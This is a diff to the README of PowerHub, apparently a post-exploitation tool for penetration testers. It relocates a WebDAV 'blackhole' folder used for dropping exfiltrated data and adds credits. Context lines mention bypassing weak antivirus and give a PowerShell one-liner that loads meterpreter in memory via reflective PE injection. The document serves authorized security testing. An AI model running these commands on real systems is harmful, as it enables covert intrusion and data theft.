@@ -103,8 +103,7 @@ contains three folders:
 * `ro` with *read only* access for everyone -- maybe you can bypass a weak
   anti virus with this
 * `blackhole` for dropping sensitive data. Any file placed here via WebDAV
-  will immediately be moved to the `blackhole` directory in the script's
-  root directory.
+  will immediately be moved to the `blackhole` directory in `$XDG_DATA_HOME`.
 
 The dependencies for the WebDAV service are `wsgidav` (installable via
 `pip3`), `cheroot` and `watchdog`.
@@ -150,6 +149,11 @@ Let's say you want to execute a meterpreter in memory, then you do this:
 ```
 PS C:\Users\pentestuser> lhm ReflectivePEInjection; lhm meterpreter.exe|re
 ```
+
+Credits
+=======
+
+PowerHub is based on the awesome work of zeroc00l, mar10, p3nt4. Thanks!
 
 Author
 ======
